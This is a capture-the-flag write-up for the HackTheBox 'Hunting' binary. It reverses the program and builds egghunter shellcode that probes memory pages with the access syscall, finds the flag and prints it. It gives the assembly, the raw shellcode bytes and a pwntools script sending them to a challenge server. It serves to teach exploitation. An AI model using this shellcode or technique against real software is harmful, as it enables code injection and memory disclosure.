---
layout: post
title: Binary Exploitation&#58; HackTheBox/Hunting
---

## HacktheBox Hunting Write-up

First, we check the file type.
```
hunting: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=801f10407444c1390cae5755d9e952f3feadf3eb, for GNU/Linux 3.2.0, stripped
```

Next, binary protections.
```
[*] '/home/jrice/ctf/htb/pwn/hunting/hunting'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

### Reversing

Let's start by running the binary.
```
jrice@jteerice:~/ctf/htb/pwn/hunting$ ./hunting
asdf
Segmentation fault (core dumped)
```

The program waits for user input and then whatever input is given results in a seg fault. Not much to go on here so we can open it up in BinaryNinja and see what we can find.

While the program is stripped, BinaryNinja had no issue finding main for us. The main function is rather simple.
```
00001460  int32_t main(int32_t argc, char** argv, char** envp)

0000146b      void* const __return_addr_1 = __return_addr
00001472      int32_t* var_10 = &argc
00001481      int32_t addr = sub_13d0()
00001495      signal(sig: 0xe, handler: exit)
000014a2      alarm(0xa)
000014be      char* eax_1 = mmap(addr, len: _init, prot: 3, flags: 0x31, fd: 0xffffffff, offset: 0)
000014cd      if (eax_1 != 0xffffffff)
000014e6          strcpy(eax_1, "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX…")
000014fc          memset("HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX…", 0, 0x25)
00001504          int32_t var_18_1 = 0
0000150b          sub_133d()
00001522          int32_t buf = mmap(addr: nullptr, len: _init, prot: 7, flags: 0x21, fd: 0xffffffff, offset: 0)
00001537          read(fd: 0, buf, nbytes: 0x3c)
0000153f          int32_t var_14_1 = 0
0000154a          buf()
0000155a          return 0
000014d4      exit(status: 0xffffffff)
000014d4      noreturn
```

An address is returned from the ```sub_13d0()``` function and is used as the address suggestion for an ```mmap``` call. Then, as long as the address returned by ```mmap``` is not ```0xffffffff```, the contents of the flag are copied into the memory buffer returned from ```map``` and the area of global memory storing the flag string is nulled. Finally, our user input is stored into another buffer returned by ```mmap``` and our input is called as a function. This is clearly a code injection challenge, but now we need to figure out what the objective of our injected code needs to be.

Since our flag is stored in a memory buffer at an address returned by the function ```sub_13d0()```, we need to see what is going on in there.
```
000013d0  int32_t sub_13d0()

000013f2      int32_t fd = open(file: "/dev/urandom", oflag: 0)
00001409      uint32_t var_1c
00001409      read(fd, buf: &var_1c, nbytes: 8)
00001417      close(fd)
00001429      srand(x: var_1c)
00001431      int32_t i = 0
00001456      while (not(i s> 0x5fffffff && i u<= 0xf7000000))
00001442          i = rand() << 0x10
0000145f      return i
```

Essentially, this function returns a random address between 0x5fffffff and 0xf7000000. 

Now we know that our flag is stored somewhere between 0x5fffffff and 0xf7000000, we have program control via out input, and we have 0x3c bytes of code to work with.

### Pwn

The code that we inject into the program needs to search the memory between the given addresses for a signature we know is contained in the flag, or in this case, the string "HTB{". We can use something similar to [egghunter shellcode](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf), but instead of jumping to our shellcode, we will print the data at the memory address that we found the signature at.

The only issue with this is, is that if we try to read from a virtual address that hasn't been mapped in our virtual address space, we will get a segmentation fault. To get around this, our shellcode will utilize the ```access``` system call. This will check to see if we have read permissions at the virtual address passed in as an argument, and if we don't, will return an ```EFAULT``` error represented by the value ```0xf2```. Taking page table granularity,into account, we only need to test one address per page in order to find a page that we have read access to.

So the logic to search our virtual address space for the signature is as follows:
```c
if (access(addr) == 0xf2) {
    test_next_page();
} else if (*addr != "HTB{") {
    test_next_addr();
} else {
    write(1, addr, NUM_BYTES_TO_PRINT);
}
```

With all this information collected, we can assemble our shellcode. Let's break it down into chunks.

First, we setup our entry. We set ```edi``` with the hex value of our signature. Note that the values are in little-endian order. Next, we load our starting address into ```edx``` and ```xor``` some registers we will use for comparisons.
```asm
section .text
main:
	mov edi, 0x7b425448
	mov edx, 0x5fffffff
	xor ecx, ecx
	xor eax, eax
```	

Here is out egghunter logic. Since ```edx``` is holding the address that we are testing, we ```or``` the first three bits to create an address that is ```(n * page_size) - 1```. This is to ensure we our test addresses are page aligned. Next we increment our address to a page aligned address and load an effective address into ```ebx``` to be used by the ```access``` system call. Finally, we load the necessary registers for our system call and compared the result to the error code ```0xf2```. If the zero-flag is set, we jump to the ```next_page``` label and continue our search. If we get a valid read address, we compare the contents of the memory address for our signature, and if we don't get a match, we increment the address by 1. 
```asm
next_page:
	or dx, 0xfff
next_addr:
	inc edx
	pusha
	lea ebx, [edx + 0x4]
	mov al, 0x21
	int 0x80
	cmp al, 0xf2 
	popa
	jz next_page
	cmp [edx], edi
	jnz next_addr
```

Finally, once we find the matching address, we setup a ```write``` system call to write the contents at the memory address to standard out. It is important to note that we are including a function epilogue to ensure that the shellcode exits correctly and doesn't crash the system.
```asm
	mov ecx, edx
	mov ebx, 1
	mov edx, 40
	mov eax, 0x04
	int 0x80
	mov esp, ebp
	pop ebp
	ret
```

Here is the whole shebang at exactly 0x3c bytes:
```asm
section .text
main:
	mov edi, 0x7b425448
	mov edx, 0x5fffffff
	xor ecx, ecx
	xor eax, eax
next_page:
	or dx, 0xfff
next_addr:
	inc edx
	pusha
	lea ebx, [edx + 0x4]
	mov al, 0x21
	int 0x80
	cmp al, 0xf2 
	popa
	jz next_page
	cmp [edx], edi
	jnz next_addr
	mov ecx, edx
	mov ebx, 1
	mov edx, 40
	mov eax, 0x04
	int 0x80
	mov esp, ebp
	pop ebp
	ret
```

To craft this into a working exploit, we need to extract the raw bytes that are assembled by the assembler. To do this, we can use a nifty python script I found called [shellcode_extractor](https://github.com/Neetx/Shellcode-Extractor).
```
nasm -f elf shellcode.asm -o shellcode
objdump -d shellcode | python3 shellcode_extractor.py
```

Now we can put this into a working exploit. The exploit is incredible simple once we have the shellcode.
```python
#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF('./hunting')

shellcode = b'\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x31\xc9\x31\xc0\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x3a\x75\xee\x89\xd1\xbb\x01\x00\x00\x00\xba\x28\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\x89\xec\x5d\xc3'

r = remote('206.189.24.162', 31288)
#r = e.process()
#r = gdb.debug('./hunting', '''
#        start < input
#        breakrva 0x154a
#        start < input
#        continue
#        ''')
r.sendline(shellcode)
r.interactive()
```

Et voila!


